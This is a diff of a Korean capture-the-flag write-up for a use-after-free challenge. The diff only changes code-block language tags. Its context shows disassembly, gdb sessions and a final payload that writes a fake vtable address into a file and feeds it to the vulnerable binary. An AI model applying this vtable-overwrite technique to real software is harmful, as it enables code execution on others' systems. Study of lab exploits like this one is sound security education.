@@ -12,7 +12,7 @@ markup: mmark
 
 8점 문제. Use After Free를 몰라서 또 찾아봐야했다.
 
-```sh
+```console
 $ ls -l
 total 24
 -rw-r----- 1 root uaf_pwn    22 Sep 25  2015 flag
@@ -114,7 +114,7 @@ main 함수가 시작되면서 Man과 Woman의 객체를 생성하며 1을 입�
 2를 입력하면 새로운 객체 생성,
 3을 입력하면 m, w 객체를 제거한다.
 
-```sh
+```console
 $ readelf -a uaf | grep "WEAK   DEFAULT   1"
     57: 00000000004015d0    24 OBJECT  WEAK   DEFAULT   15 _ZTI3Man
     59: 0000000000401580    32 OBJECT  WEAK   DEFAULT   15 _ZTV5Human
@@ -142,7 +142,7 @@ $
 
 `readelf -a uaf`로 긁어서 옆 모니터에 놔두고 진행했다.
 
-```x86asm
+```cpp-objdump
 0000000000400ec4 <main>:
   ...
   400f92:       be fa 14 40 00          mov    $0x4014fa,%esi   ; while(1)
@@ -165,7 +165,7 @@ $
 
 이렇게 분기점이 갈리고,
 
-```x86asm
+```cpp-objdump
 0000000000400ec4 <main>:
   ...
   400fcd:       48 8b 45 c8             mov    -0x38(%rbp),%rax ; m
@@ -189,7 +189,7 @@ $
 case 1 영역을 볼 때, [rbp-0x38]과 [rbp-0x30]은
 각각 m 객체와 w 객체인데 저기에 브레이크를 걸고 레지스터를 따라갔다.
 
-```x86asm
+```cpp-objdump
 (gdb) b *main+269
 Breakpoint 1 at 0x400fd1
 (gdb) r
@@ -226,7 +226,7 @@ Breakpoint 1, 0x0000000000400fd1 in main ()
 0x401570 대신 0x401568이 있다면 8을 더한 값인 0x401570이 가리키는
 0x40117a 함수를 호출할 수 있다.
 
-```x86asm
+```cpp-objdump
 (gdb) r
 Starting program: /home/uaf/uaf
 1. use
@@ -253,7 +253,7 @@ m, w 객체를 삭제하고 해당 객체를 가리켰을 레지스터를 보면
 AAAA 파일에 AAAA를 기록하고 인자로 전달해서
 메모리가 어떻게 할당되는지를 보면
 
-```x86asm
+```c-objdump
 (gdb) b *main+353
 Breakpoint 1 at 0x401025
 (gdb) r 4 /tmp/ko/AAAA
@@ -282,7 +282,7 @@ Breakpoint 1, 0x0000000000401025 in main ()
 
 보통은 이렇게 낮은 주소부터 메모리를 할당하는데...
 
-```x86asm
+```c-objdump
 (gdb) b *main+353
 Breakpoint 1 at 0x401025
 (gdb) r 4 /tmp/ko/AAAA
@@ -317,7 +317,7 @@ Breakpoint 1, 0x0000000000401025 in main ()
 
 풀이
 
-```sh
+```console
 $ python -c "print '\x68\x15\x40\x00'" > /tmp/ko/BBBB
 $ ./uaf 4 /tmp/ko/BBBB
 1. use
